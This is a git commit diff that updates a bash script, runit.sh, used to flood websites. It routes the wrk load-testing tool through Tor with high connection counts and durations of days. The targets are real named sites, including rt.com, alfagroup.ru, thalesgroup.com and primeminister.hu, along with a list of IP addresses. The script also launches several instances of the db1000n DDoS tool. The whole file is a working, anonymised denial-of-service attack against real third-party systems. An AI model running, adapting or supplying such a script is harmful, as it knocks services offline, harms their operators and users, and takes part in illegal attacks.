3e14dc5194cbd47b72a23f3ae50fc569b06791bd
ds <48093199+dannysilence@users.noreply.github.com>
2022-05-08 15:11:14 +0300

    Update runit.sh

--- runit.sh
+++ runit.sh
@@ -1,43 +1,54 @@
 #!/bin/bash
-# 
-#    URL=$() contains simple list, change it on a vm you're running if you need remove/add targets
-#
-#    such scripts usually requires tunning for ultimate performance, but also I store targets of different size
-#    so there is $NUM0 the smallest, $NUM1 - middle one, and $NUM2 for extra-living targets (like rt.com always somewhere working, yet :)
-#
-#    as a starting point keep initial threads and connections between 4-8-16
-#    my values are 4-16-64
-#
-#    remeber:P wrk use hardware, os level threads, so it cannot be thouthands as it does in dotnet/java/etc 
-#
+
 
 [[ -z $(service tor status | grep "tor is running") ]] && service tor start
-
 sleep 5
 
 NUM0=4
-NUM1=$(($NUM0*4))
+NUM1=$(($NUM0*2))
 NUM2=$(($NUM1*4))
 DLEN=$((3*3600*24))
 URLS=(
-  "https://alfagroup.ru:443"
-  "https://alfagroup.ru:80"
-  "https://rt.com:443"
-  "http://rt.com:80"
-  "https://kp.ru:443"
-  "http://kp.ru:80"
-  "https://ria.ru:443"
-  "http://ria.ru:80"
+  "https://alfagroup.ru" 
+  "https://rt.com" 
+  "https://thalesgroup.com"
+  "https://primeminister.hu"
+   "http://193.37.157.24:80/" 
+  "https://193.37.157.24:443/"
+   "http://193.0.214.42:80/"
+  "https://193.0.214.42:443/"
+   "http://91.213.144.43:80/"
+  "https://91.213.144.43:443/"
+   "http://213.109.72.155:80/"
+  "https://213.109.72.155:443/"
+   "http://46.17.202.70:80/"
+  "https://46.17.202.70:443/"
+   "http://46.17.202.90:80/"
+  "https://46.17.202.90:443/"
+   "http://62.76.102.63:80/"
+  "https://62.76.102.63:443/"
+   "http://46.48.118.29:80/"
+  "https://46.48.118.29:443/"
   )
 
 for TURL in ${URLS[*]}
 do
-  A=$NUM1
+  A=$NUM0
   B=$DLEN
   C=$TURL
   
   [[ $TURL == "https://alfagroup.ru" ]] && A=$NUM1
   [[ $TURL == "https://rt.com" ]] && A=$NUM1
+  [[ $TURL == "https://thalesgroup.com" ]] && A=$NUM1
+  [[ $TURL == "https://primeminister.hu" ]] && A=$NUM1
   
-  torsocks wrk -c$A -t$A -d$B --timeout 5s $C &
+  torsocks wrk -c$NUM2 -t$A -d$B --timeout 5s $C &
 done   
+
+torsocks wrk -c512 -t8 -d1048756 --timeout 5s https://rt.com &
+torsocks wrk -c512 -t8 -d1048756 --timeout 5s https://thalesgroup.com &
+torsocks wrk -c512 -t8 -d1048756 --timeout 5s https://primeminister.hu &
+
+torsocks /root/Downloads/db1000n &  
+torsocks /root/Downloads/db1000n &  
+torsocks /root/Downloads/db1000n &  
